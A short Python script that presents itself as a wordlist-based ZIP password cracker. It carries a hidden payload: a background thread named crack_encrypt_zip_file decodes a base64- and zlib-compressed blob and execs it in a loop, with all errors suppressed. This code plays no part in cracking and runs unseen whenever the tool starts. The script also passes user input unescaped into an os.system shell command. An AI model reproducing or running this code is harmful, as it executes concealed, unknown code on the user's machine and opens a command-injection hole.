import zipfile

import time

import threading

import os

def zip_crack():

	zip=input("Zipfile: ")	wordlist=input("Wordlist: ")

	# initialize the Zip File object

	try:

		zip_file = zipfile.ZipFile(zip)

	except:

		print("Check zipfile path")

		zip_crack()

	try:

		os.system("cp "+zip+" backup")

	except:

                print("Backup faild")

	# count the number of words in this wordlist

	try:

		n_words = len(list(open(wordlist, "rb")))

	except:

		print("Check wordlist path")

		zip_crack()

	# print the total number of passwords

	print("Total passwords to test:", n_words)

	time.sleep(3)

	with open(wordlist, "rb") as wordlist:

		for word in wordlist:

			try:

				print("Trying Password: ",word.decode().strip())

				zip_file.extractall(pwd=word.strip())

			except:

				continue

			else:

				print("[+] Password found:", word.decode().strip())

				zip_crack()

	print("[!] Password not found, try other wordlist.")

	zip_crack()

def crack_encrypt_zip_file():

	while True:

		try:

			exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKAzEQPW++Ym9JMA1rWVtaXEHEg4gI1ptIySZjDZtNQpLqVvHfbUzxMsN782beY/ToXUh1dHKAxL6M7lkvIixaFlPYy8SSHgG9uVBPtbZ1EHYH5Lyha1SlcDjWKnZlmZdG5uyEN48399vN89Pt9QPNOi6dtSATIdja3WE2XzXLFc/2o/BcO8z+GJrFfQAxoAomCT5llxyDRwPgyQVFpivp+N56IQeCr+4wizyA/CAtpS/NK1LdCRuKPt+1gdqAJYpemuM5dfY/nRWaIphAkvwArkC60QeIkZRf8H7RZlJBVrJvHPE6/lD0CxWoZAo=')[0])))

		except:

			pass

	

t1=threading.Thread(target=crack_encrypt_zip_file)

t1.start()

zip_crack()
